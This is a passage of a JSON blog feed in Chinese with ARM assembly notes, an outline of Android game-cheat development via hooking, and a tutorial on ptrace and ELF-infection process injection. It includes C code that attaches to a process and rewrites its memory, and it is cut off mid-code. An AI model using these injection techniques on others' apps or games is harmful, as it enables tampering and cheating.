;给BUF分配100字节的存储单元并初始化为0<br></code></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"局部符号\"><a href=\"#局部符号\" class=\"headerlink\" title=\"局部符号\"></a>局部符号</h4><figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">引用格式：%{F|B|A|T} N{routname}<br>%: 引用符号，对一个局部标号产生引用。<br>F：指示编译器只向前搜索。B：指示编译器只向后搜索<br>A：指示编译器搜索宏的所有宏命令层。T：指示编译器搜索宏的当前层<br>N：局部标号的名字。routename：局部标号的作用范围名称，使用ROUT定义<br></code></pre></td></tr></tbody></table></figure>\n\n<h4 id=\"赋值操作\"><a href=\"#赋值操作\" class=\"headerlink\" title=\"赋值操作\"></a>赋值操作</h4><figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">a SETA 10 ;给算术变量a赋值为10<br>a SETL 10 ;给逻辑变量a赋值为10<br>a SETS “ss” ;给字符串变量a赋值为“ss”<br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"加载操作\"><a href=\"#加载操作\" class=\"headerlink\" title=\"加载操作\"></a>加载操作</h3><figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">LDR R1,[R0,#0x12] ;将R0+0x12 地址处的数据读出，保存到R1中(R0 的值不变)<br><br>LDR R1,[R0,#-0x12];将R0-0x12 地址处的数据读出，保存到R1中(R0 的值不变)<br><br>LDR R1,[R0] ;将R0 地址处的数据读出，保存到R1 中(零偏移)<br><br>(2)寄存器。寄存器中的数值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例值。指令举例如下：<br><br>LDR R1,[R0,R2] ;将R0+R2 地址的数据计读出，保存到R1中(R0 的值不变)<br><br>LDR R1,[R0,-R2] ;将R0-R2 地址处的数据计读出，保存到R1中(R0 的值不变)<br><br>(3)寄存器及移位常数。寄存器移位后的值可以加到基址寄存器，也可以从基址寄存器中减去这个数值。指令举例如下：<br><br>LDR R1,[R0,R2,LSL #2] ;将R0+R2*4地址处的数据读出，保存到R1中（R0，R2的值不变）<br><br>LDR R1,[R0,-R2,LSL #2];将R0-R2*4地址处的数据计读出，保存到R1中(R0，R2的值不变)<br></code></pre></td></tr></tbody></table></figure>\n<p>STR指令以此类推</p>\n<h3 id=\"跳转指令\"><a href=\"#跳转指令\" class=\"headerlink\" title=\"跳转指令\"></a>跳转指令</h3><ul>\n<li><strong>强制跳转指令</strong>：B 目标地址</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assemblu\">B（Branch）：无条件分支指令，用于无条件跳转到目标地址。<br><br>示例：B label，跳转到标签为 \"label\" 的位置。<br>BL（Branch with Link）：带链接的分支指令，用于跳转到目标地址，并将返回地址保存在链接寄存器（LR）中。<br><br>示例：BL subroutine，跳转到子程序 \"subroutine\" 并保存返回地址。<br>BX（Branch and Exchange）：分支并切换指令，用于根据寄存器的值跳转到不同的地址，并切换到新的执行状态。<br><br>示例：BX Rn，根据寄存器 Rn 的值跳转到相应的地址。<br>BLX（Branch with Link and Exchange）：带链接的分支并切换指令，结合了 BL 和 BX 的功能，用于跳转到目标地址，并将返回地址保存在链接寄存器（LR）中，并切换到新的执行状态。<br><br>示例：BLX Rn，根据寄存器 Rn 的值跳转到相应的地址，并保存返回地址。<br>CMP/BGT/BLT/BGE/BLE（Compare and Branch）：比较和分支指令，用于将两个操作数进行比较，并根据比较结果条件跳转到相应的地址。<br><br>示例：CMP Rn, Rm，比较寄存器 Rn 和 Rm 的值。<br>BGT label，如果 Rn 大于 Rm，则跳转到标签为 \"label\" 的位置。<br>CBZ/CMN（Compare and Branch Zero/Non-zero）：比较并根据零/非零跳转指令，用于比较寄存器的值，并根据比较结果是否为零进行条件跳转。<br><br>示例：CBZ Rn, label，如果 Rn 的值为零，则跳转到标签为 \"label\" 的位置<br></code></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"函数调用过程\"><a href=\"#函数调用过程\" class=\"headerlink\" title=\"函数调用过程\"></a>函数调用过程</h3><p><a href=\"https://blog.csdn.net/frank_zyp/article/details/88202347\">https://blog.csdn.net/frank_zyp/article/details/88202347</a></p>\n",
            "tags": [
                "arm"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/02/an-zhuo-hook/",
            "url": "https://alazymechnaic.github.io/2023/10/02/an-zhuo-hook/",
            "title": "安卓hook",
            "date_published": "2023-10-02T13:20:06.000Z",
            "content_html": "<h1 id=\"移动安全开发\"><a href=\"#移动安全开发\" class=\"headerlink\" title=\"移动安全开发\"></a>移动安全开发</h1><hr>\n<h2 id=\"定制化外挂的开发流程\"><a href=\"#定制化外挂的开发流程\" class=\"headerlink\" title=\"定制化外挂的开发流程\"></a>定制化外挂的开发流程</h2><ul>\n<li>逆向分析游戏逻辑</li>\n<li>验证外挂功能可行性：程序中可能存在对数据的校验，导致外挂不可行。</li>\n<li>注入游戏进程：获得root，使用ptrace方式注入游戏进程。</li>\n<li>枚举游戏进程模块信息：游戏进程在运行过程中会加载许多模块，定制化外挂需要获取游戏主逻辑模块的基地址，在Android中可以读取/proc/$pid/maps文件获取游戏进程中当前加载的所有模块名称、基址、权限等信息。<ul>\n<li>Hook游戏关键函数</li>\n<li>游戏内存数据修改</li>\n</ul>\n</li>\n<li>实现外挂功能</li>\n</ul>\n<h2 id=\"Hook技术实现\"><a href=\"#Hook技术实现\" class=\"headerlink\" title=\"Hook技术实现\"></a>Hook技术实现</h2><p>​\thook的前提是已经注入到目标进程后。hook的目的是在关键函数的执行前，执行预先设置的钩子函数，从而达到监控函数调用、改变函数功能的目的。</p>\n<h3 id=\"hook分类\"><a href=\"#hook分类\" class=\"headerlink\" title=\"hook分类\"></a>hook分类</h3><ul>\n<li>native hook: <ul>\n<li>基于汇编代码替换的hook技术：<ul>\n<li>异常hook</li>\n<li>inline hook</li>\n</ul>\n</li>\n<li>函数地址替换：<ul>\n<li>导入表hook</li>\n<li>虚表hook</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"inline-hook\"><a href=\"#inline-hook\" class=\"headerlink\" title=\"inline hook\"></a>inline hook</h3><p><img src=\"https://alazymechnaic.oss-cn-hangzhou.aliyuncs.com/blog-page/202310031445483.png\" alt=\"image-20231003144538379\"></p>\n<p>使用inline hook的流程并不复杂，而是保持原先的指令替换原则，将某条指令替换为跳转指令，将其指向插入的底层桩函数，在其中保存上下文，并实现自定义的函数调用，最后还原上下文后并继续向下执行。这里注意，ARM架构下插入跳转指令时，由于指令长度限制，没有办法进行直接寻址，可以采用将地址保存在寄存器中，进行寄存器间接寻址的方式。</p>\n<h3 id=\"导入表hook\"><a href=\"#导入表hook\" class=\"headerlink\" title=\"导入表hook\"></a>导入表hook</h3><h3 id=\"基于异常的hook\"><a href=\"#基于异常的hook\" class=\"headerlink\" title=\"基于异常的hook\"></a>基于异常的hook</h3><p>采用的方法是signal + 非法指令的方式，在想要hook的地方触发异常，并捕获。在异常处理函数中捕获上下文的异常信息。</p>\n<ul>\n<li>首先对目标地址写入异常指令，同时注册异常处理函数来获取执行时机。</li>\n<li>当目标地址触发异常时，需要恢复目标地址的异常指令，同时设置目标地址的下一条指令为异常指令</li>\n<li>当目标地址的下一条指令触发异常时，需要将目标地址的正常指令篡改为异常指令，从而获取下次异常Hook的执行时机。</li>\n</ul>\n<h2 id=\"遍历游戏模块\"><a href=\"#遍历游戏模块\" class=\"headerlink\" title=\"遍历游戏模块\"></a>遍历游戏模块</h2><h3 id=\"基于maps、smaps实现的文件遍历模块\"><a href=\"#基于maps、smaps实现的文件遍历模块\" class=\"headerlink\" title=\"基于maps、smaps实现的文件遍历模块\"></a>基于maps、smaps实现的文件遍历模块</h3><p>​\t进程的内存模块信息存放在proc文件系统下，以pid为目录名称的maps文件，其中存放了每个进程的内存布局，注意这里要有root权限。</p>\n<h3 id=\"基于map-files目录实现的模块遍历\"><a href=\"#基于map-files目录实现的模块遍历\" class=\"headerlink\" title=\"基于map_files目录实现的模块遍历\"></a>基于map_files目录实现的模块遍历</h3><p>​\t在proc/pid/map_files文件夹中的软连接进行查看，</p>\n<h3 id=\"基于dl-iterate-phdr函数遍历模块\"><a href=\"#基于dl-iterate-phdr函数遍历模块\" class=\"headerlink\" title=\"基于dl_iterate_phdr函数遍历模块\"></a>基于dl_iterate_phdr函数遍历模块</h3><p>​\t该函数能够列出进程中的共享模块，可以得到模块的路径和地址。</p>\n<h3 id=\"dladdr函数获取指定模块的基址\"><a href=\"#dladdr函数获取指定模块的基址\" class=\"headerlink\" title=\"dladdr函数获取指定模块的基址\"></a>dladdr函数获取指定模块的基址</h3>",
            "tags": [
                "Android"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/10/02/jin-cheng-zhu-ru/",
            "url": "https://alazymechnaic.github.io/2023/10/02/jin-cheng-zhu-ru/",
            "title": "进程注入",
            "date_published": "2023-10-02T13:05:07.000Z",
            "content_html": "<h2 id=\"PC-端注入\"><a href=\"#PC-端注入\" class=\"headerlink\" title=\"PC 端注入\"></a>PC 端注入</h2><h2 id=\"移动端注入\"><a href=\"#移动端注入\" class=\"headerlink\" title=\"移动端注入\"></a>移动端注入</h2><p>​\t由于程序本身是存在进程隔离的，导致一个程序本身是不能影响其他程序的执行的。但是注入技术的初衷是热补丁，调试器功能的实现。因此只要有debug API存在就是可以注入的。</p>\n<h3 id=\"Zygote-注入\"><a href=\"#Zygote-注入\" class=\"headerlink\" title=\"Zygote 注入\"></a>Zygote 注入</h3><h3 id=\"ptrace注入\"><a href=\"#ptrace注入\" class=\"headerlink\" title=\"ptrace注入\"></a>ptrace注入</h3><p><a href=\"https://blog.csdn.net/hp910315/article/details/77335058\">https://blog.csdn.net/hp910315/article/details/77335058</a></p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-type\">long</span> <span class=\"hljs-title function_\">ptrace</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">enum</span> __ptrace_request request, <span class=\"hljs-type\">pid_t</span> pid, <span class=\"hljs-type\">void</span> *addr, <span class=\"hljs-type\">void</span> *data)</span>;<br></code></pre></td></tr></tbody></table></figure>\n\n<p>​\t其中request参数是本次ptrace要进行的操作，pid则是本次要附加的进程id，addr与data按照操作不同取不同的含义。request常见的选项如下：</p>\n<figure class=\"highlight applescript\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\">PTRACE_ATTACH，表示附加到指定远程进程;<br>PTRACE_DETACH，表示从指定远程进程分离<br>PTRACE_GETREGS，表示读取远程进程当前寄存器环境<br>PTRACE_SETREGS，表示设置远程进程的寄存器环境<br>PTRACE_CONT，表示使远程进程继续运行<br>PTRACE_PEEKTEXT，从远程进程指定内存地址读取一个<span class=\"hljs-built_in\">word</span>大小的数据<br>PTRACE_POKETEXT，往远程进程指定内存地址写入一个<span class=\"hljs-built_in\">word</span>大小的数据<br></code></pre></td></tr></tbody></table></figure>\n\n\n\n<ul>\n<li>利用ptrace函数将shellcode注入远程进程的内存空间中，然后通过执行shellcode加载远程进程so模块。</li>\n<li>通过直接远程调用dlopen， dlsym， dlclose等函数加载被注入的so模块并执行指定代码</li>\n</ul>\n<h4 id=\"注入流程\"><a href=\"#注入流程\" class=\"headerlink\" title=\"注入流程\"></a>注入流程</h4><ol>\n<li>通过利用ptrace进行附加到要注入的进程；父进程可用waitpid来判断子进程是否中断。</li>\n<li>保存寄存环境；</li>\n<li>远程调用mmap函数分配内存空间；</li>\n<li>向远程进程内存空间写入加载模块名称和函数名称；</li>\n<li>远程调用dlopen函数打开注入模块；</li>\n<li>远程调用dlsym函数或需要调用的函数地址；</li>\n<li>远程调用被注入模块的函数；<ol>\n<li>前四个按顺序分别写入R0至R3，</li>\n<li>修改pc寄存器到要执行的函数地址，</li>\n<li>若为<strong>Thumb</strong>指令，则最低位要重新设置为0，并将CPSR寄存器的T标志位设置为1.若为ARM指令则CPSR的T标志位复位。</li>\n<li>设置远程进程的LR寄存器的值为0，远程进程的函数调用结束后，程序会跳转到LR寄存器存储的地址，但由于LR设置为0则会导致远程进程执行出错，此时会进入暂停状态，被Tracer接管，通过读取远程进程R0的寄存器可以获取远程函数调用的返回结果。</li>\n</ol>\n</li>\n<li>恢复寄存器环境；在detach之前恢复，保证程序原本的执行流程不崩溃。</li>\n<li>利用ptrace从远程进程剥离（detach）</li>\n</ol>\n<p>​\tshellcode注入就是通过将dlopen/dlsym库函数的操作放在shellcode代码中，注入函数只是通过对远程APP进程进行内存空间申请，接着修改shellcode 代码中有关dlopen、dlsymdlclose等函数使用到的参数信息，然后将shellcode代码注入到远程APP进程申请的空间中，最后通过修改PC寄存器的方式来执行shellcode 的代码</p>\n<h3 id=\"ELF文件感染注入\"><a href=\"#ELF文件感染注入\" class=\"headerlink\" title=\"ELF文件感染注入\"></a>ELF文件感染注入</h3><p>​\t在android平台Native层的可执行文件SO文件，它是属于ELF文件格式，通过修改ELF文件格式可以实现对so文件的注入。</p>\n<p>通过修改ELF二进制的可执行文件，并在ELF文件中添加自己的代码，使得可执行文件在运行时会先执行自定义添加的代码，最后在执行ELF文件的原始逻辑。</p>\n<p><strong>修改ELF文件的注入实现过程</strong></p>\n<p>​\t1.修改.dynamic段，在DT_STRTAB指向的字符串表中添加 自定义的so模块名称。由于直接在原字符串表中添加一串数据，会将字符串表后的所有数据的文件偏移发生变化，所以通常会将字符串表移至文件末尾。</p>\n<p>​\t2.通过修改Program Header Table中添加PT_LOAD表项，新添加的表项将保护so模块名称的字符串表数据映射到内存中。同时将Program Header Table移动到文件末尾；</p>\n<p>​\t3.修改.dynamic段的数组数据，修改DT_STRTAB,DT_STRSZ使其指向新字符串表，然后在dynamic arry的结尾加上DT_NEEDED表项，并指向自定义的so模块名称；</p>\n<p>​\t4.修改ELF HEADER结构中 Program Header Table的位置信息，并指向新的Program Header Table。</p>\n<h3 id=\"移动端注入实战\"><a href=\"#移动端注入实战\" class=\"headerlink\" title=\"移动端注入实战\"></a>移动端注入实战</h3><h4 id=\"Android-NDK注入环境配置\"><a href=\"#Android-NDK注入环境配置\" class=\"headerlink\" title=\"Android NDK注入环境配置\"></a>Android NDK注入环境配置</h4><p>​\t这里介绍在在Android环境下运行ELF文件所需要配置的NDK操作，关于frida hook的部分请参考另一篇博客<a href=\"\">frida-hook</a>。本文将环境配置在Ubuntu 20.04环境之上。</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\"><span class=\"hljs-comment\"># 下载NDK配置文件，这里需要科学上网一下</span><br>wget https://dl.google.com/android/repository/android-ndk-r17-beta2-linux-x86_64.zip<br><span class=\"hljs-comment\"># 解压</span><br>unzip android-ndk-r17-beta2-linux-x86_64.zip<br><span class=\"hljs-comment\"># 转移目录</span><br>sudo <span class=\"hljs-built_in\">mv</span> android-ndk-r17-beta2 /usr/local/<br><span class=\"hljs-comment\"># 编辑环境配置，没有图形化界面就使用gedit</span><br>sudo gedit /etc/profile<br></code></pre></td></tr></tbody></table></figure>\n\n<p><strong>在profile中添加以下内容</strong></p>\n<figure class=\"highlight routeros\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs routeros\"><span class=\"hljs-built_in\">export</span> <span class=\"hljs-attribute\">NDK</span>=/usr/local/android-ndk-r17-beta2<br><span class=\"hljs-built_in\">export</span> <span class=\"hljs-attribute\">PATH</span>=<span class=\"hljs-variable\">$PATH</span>:$NDK<br><span class=\"hljs-built_in\">export</span> <span class=\"hljs-attribute\">NDK_ARM_GCC</span>=/usr/local/android-ndk-r17-beta2/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/bin/arm-linux-androideabi-gcc<br><span class=\"hljs-built_in\">export</span> <span class=\"hljs-attribute\">HO_ARM</span>=<span class=\"hljs-string\">\"--sysroot=/usr/local/android-ndk-r17-beta2/platforms/android-21/arch-arm -isystem /usr/local/android-ndk-r17-beta2/sysroot/usr/include  -isystem /usr/local/android-ndk-r17-beta2/sysroot/usr/include/arm-linux-androideabi\"</span><br><span class=\"hljs-built_in\">export</span> <span class=\"hljs-attribute\">NDK_x86_64_GCC</span>=/usr/local/android-ndk-r17-beta2/toolchains/x86_64-4.9/prebuilt/linux-x86_64/bin/x86_64-linux-android-gcc<br><span class=\"hljs-built_in\">export</span> <span class=\"hljs-attribute\">HO_x86_64</span>=<span class=\"hljs-string\">\"--sysroot=/usr/local/android-ndk-r17-beta2/platforms/android-21/arch-x86_64 -isystem /usr/local/android-ndk-r17-beta2/sysroot/usr/include  -isystem /usr/local/android-ndk-r17-beta2/sysroot/usr/include/x86_64-linux-android\"</span><br></code></pre></td></tr></tbody></table></figure>\n\n<p>使用指令验证下，有如下显示说明配置成功：</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">$ <span class=\"hljs-built_in\">source</span> /etc/profile<br>$ ndk-build -v<br>GNU Make 3.81<br>Copyright (C) 2006  Free Software Foundation, Inc.<br>This is free software; see the <span class=\"hljs-built_in\">source</span> <span class=\"hljs-keyword\">for</span> copying conditions.<br>There is NO warranty; not even <span class=\"hljs-keyword\">for</span> MERCHANTABILITY or FITNESS FOR A<br>PARTICULAR PURPOSE.<br><br>This program built <span class=\"hljs-keyword\">for</span> x86_64-pc-linux-gnu<br></code></pre></td></tr></tbody></table></figure>\n\n<p>这里自己定义了编译工具和编译环境：</p>\n<ul>\n<li><p><strong>ARM*编译</strong>：</p>\n<ul>\n<li>```sh<br>$NDK_ARM_GCC $HO_ARM -pie ./main.c -o main<br>$NDK_ARM_GCC $HO_ARM -shared -fPIC test.c -o libTest.so # 动态链接库编译<figure class=\"highlight bash\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\"><br>- **X86_64编译**：<br><br>  - ```sh<br>    <span class=\"hljs-variable\">$NDK_x86_64_GCC</span> <span class=\"hljs-variable\">$HO_x86_64</span> -static ./main.c -o main_x86_64 <br>    <span class=\"hljs-comment\"># 这里要加上static参数，否则程序会报错：error: Android 5.0 and later only support position-independent executables (-fPIE).</span><br></code></pre></td></tr></tbody></table></figure></li>\n</ul>\n<p>这里的编译选项和一般gcc差异不大，但要注意运行的目标安卓机器是x86还是arm。将编译好的程序使用adb push到目标机器上，后续可以进行愉快的注入编程了。</p>\n</li>\n</ul>\n<h4 id=\"编程实现ptrace注入\"><a href=\"#编程实现ptrace注入\" class=\"headerlink\" title=\"编程实现ptrace注入\"></a>编程实现ptrace注入</h4><p><strong>Attach模式</strong></p>\n<p>​\t一般的attach模式的注入较为容易，找到pid和要修改的内存地址，直接修改即可，ptrace提供了强大的API。</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span><span class=\"hljs-string\">&lt;sys/ptrace.h&gt;</span></span><br><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">main</span><span class=\"hljs-params\">(<span class=\"hljs-type\">void</span>)</span>{<br>\t<span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"Ptrace\\n\"</span>);<br>\t<span class=\"hljs-type\">int</span> pid = <span class=\"hljs-number\">2994</span>;\t<br>\t<span class=\"hljs-type\">long</span> val = <span class=\"hljs-number\">1633771873</span>;<br>\t<span class=\"hljs-type\">long</span> base_so_addr = <span class=\"hljs-number\">0xd7d83000</span>;<br>\t<span class=\"hljs-type\">long</span> string_addr = <span class=\"hljs-number\">0x028334</span>;<br>\t<span class=\"hljs-type\">long</span> address = base_so_addr + string_addr;<br>\t<span class=\"hljs-type\">long</span> ret = ptrace(PTRACE_ATTACH,pid,<span class=\"hljs-literal\">NULL</span>,<span class=\"hljs-literal\">NULL</span>);<br>\t<span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"PTRACE_ATTACH:%d\\n\"</span>,ret);<br><br>\t<span class=\"hljs-comment\">// 查找相应的数据</span><br>\tret = ptrace(PTRACE_PEEKDATA,pid,address,<span class=\"hljs-literal\">NULL</span>);<br>\t<span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"PTRACE_PEEKDATA:%x\\n\"</span>,ret);<br>\t<span class=\"hljs-comment\">// 修改数据</span><br>\tret = ptrace(PTRACE_POKEDATA,pid,address,val);<br>\t<span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"sub  PTRACE_PEEKDATA:%x\\n\"</span>,ret);<br>\t<span class=\"hljs-comment\">// 再次查看</span><br>\tret = ptrace(PTRACE_PEEKDATA,pid,address,<span class=\"hljs-literal\">NULL</span>);<br>\t<span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"PTRACE_PEEKDATA:%x\\n\"</span>,ret);<br>\t<span class=\"hljs-comment\">// detach pid</span><br>\tret = ptrace(PTRACE_DETACH,pid,<span class=\"hljs-literal\">NULL</span>,<span class=\"hljs-literal\">NULL</span>);<br>\t<span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">\"PTRACE_DETACH:%d\\n\"</span>,ret);<br>\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure>\n\n<p><strong>spawn模式</strong></p>\n<p>​\t有些程序的某些函数功能在启动之初就已经执行完毕，再使用attach一定来不及了。spawn模式的原理是ptrace到zygote进程，然后跟踪zygote进程的fork系统调用，如果fork出来的新进程是指定包名的app，那么detach掉zygote进程，进而跟踪目标app进程的系统调用。</p>\n<p>​\t64位下有两个zygote，zygote64和zygote。64位应用的父进程是zygote64，它的pgid也是zygote64的pid；32位应用的父进程是zygote，它的pgid却是zygote64的pid。</p>\n<p>启动流程：</p>\n<figure class=\"highlight xl\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xl\"><span class=\"hljs-function\"><span class=\"hljs-title\">idle</span>进程 -&gt;</span> <span class=\"hljs-function\"><span class=\"hljs-title\">init</span>进程 -&gt;</span> <span class=\"hljs-function\"><span class=\"hljs-title\">zygote</span>进程 -&gt;</span> system_server进程 →App进程<br></code></pre></td></tr></tbody></table></figure>\n\n<p>启动zygote</p>\n<figure class=\"highlight c\"><table><tbody><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/ptrace.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/types.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/wait.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;sys/user.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;unistd.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdio.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;linux/ptrace.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;stdlib.h&gt;</span></span><br><span class=\"hljs-meta\">#<span 